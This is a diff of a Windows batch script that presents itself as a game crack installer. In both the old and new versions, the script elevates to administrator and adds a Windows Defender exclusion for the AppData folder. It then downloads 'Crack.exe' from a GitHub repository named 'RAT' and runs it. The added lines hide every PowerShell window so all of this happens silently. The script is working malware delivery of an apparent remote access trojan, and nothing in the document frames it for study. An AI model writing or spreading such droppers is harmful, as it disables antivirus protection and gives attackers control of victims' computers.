@@ -1,42 +1,22 @@
 @echo off
-:: Elevate to admin if not already running with it
+:: Relaunch as admin if not elevated
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
-    powershell -Command "Start-Process '%~f0' -Verb runAs"
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
 
-:: Set up paths
-set "TARGET_DIR=%APPDATA%\SubDir"
-set "GAME_URL=https://raw.githubusercontent.com/GLICHED-HACKER/RAT/main/Crack.exe"
-set "GAME_FILE=%TARGET_DIR%\Crack.exe"
+:: Set paths
+set "APPDATA_PATH=%USERPROFILE%\AppData"
+set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
+set "DOWNLOAD_URL=https://github.com/GLICHED-HACKER/RAT/raw/main/Crack.exe"
 
-:: Create directory if needed
-if not exist "%TARGET_DIR%" (
-    mkdir "%TARGET_DIR%"
-)
+:: Add Windows Defender exclusion silently
+powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
-:: Add exclusion for the download location BEFORE download
-powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'"
+:: Download file silently
+powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 
-:: Optionally exclude the entire AppData\Roaming dir too
-powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'"
-
-:: Clean output
-echo Downloading crack
-
-:: Download the file
-powershell -Command "Invoke-WebRequest -Uri '%GAME_URL%' -OutFile '%GAME_FILE%' -UseBasicParsing"
-
-:: Wait for download to complete
-:waitloop
-if exist "%GAME_FILE%" (
-    goto run
-) else (
-    timeout /t 1 >nul
-    goto waitloop
-)
-
-:run
-start "" "%GAME_FILE%"
-exit /b
+:: Run file silently
+start "" "%TARGET_FILE%"
+exit
